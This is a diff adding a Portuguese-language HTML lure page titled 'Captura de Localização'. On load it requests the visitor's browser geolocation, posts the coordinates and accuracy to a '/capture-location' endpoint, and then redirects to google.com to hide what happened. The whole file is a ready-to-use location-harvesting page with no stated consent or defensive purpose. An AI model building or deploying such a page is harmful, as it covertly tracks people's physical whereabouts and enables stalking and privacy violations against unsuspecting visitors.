@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Captura de Localização</title>
+    </head>
+    <body>
+        <h1>Bem-vindo!</h1>
+        <p>Obtendo sua localização, por favor aguarde...</p>
+        <script>
+            // Função para capturar geolocalização
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const data = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                            };
+
+                            // Enviar dados de geolocalização para o servidor
+                            fetch('/capture-location', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify(data),
+                            }).then(() => {
+                                // Redirecionar para outra página após o envio
+                                window.location.href = 'https://www.google.com';
+                            });
+                        },
+                        (error) => {
+                            console.error('Erro ao obter localização:', error);
+                            window.location.href = 'https://www.google.com';
+                        }
+                    );
+                } else {
+                    console.error(
+                        'Geolocalização não é suportada pelo navegador.'
+                    );
+                    window.location.href = 'https://www.google.com';
+                }
+            }
+
+            // Capturar localização ao carregar a página
+            getLocation();
+        </script>
+    </body>
+</html>
